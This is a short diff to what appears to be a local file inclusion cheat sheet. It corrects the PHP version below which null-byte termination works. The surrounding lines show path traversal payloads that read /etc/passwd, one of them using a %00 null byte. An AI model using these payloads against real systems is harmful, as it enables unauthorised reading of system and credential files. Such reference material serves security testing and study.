@@ -46,7 +46,7 @@ http://example.com/index.php?page=../../../etc/passwd
 
 ### Null byte
 
-:warning: In versions of PHP below 5.3 we can terminate with null byte.
+:warning: In versions of PHP below 5.3.4 we can terminate with null byte.
 
 ```powershell
 http://example.com/index.php?page=../../../etc/passwd%00
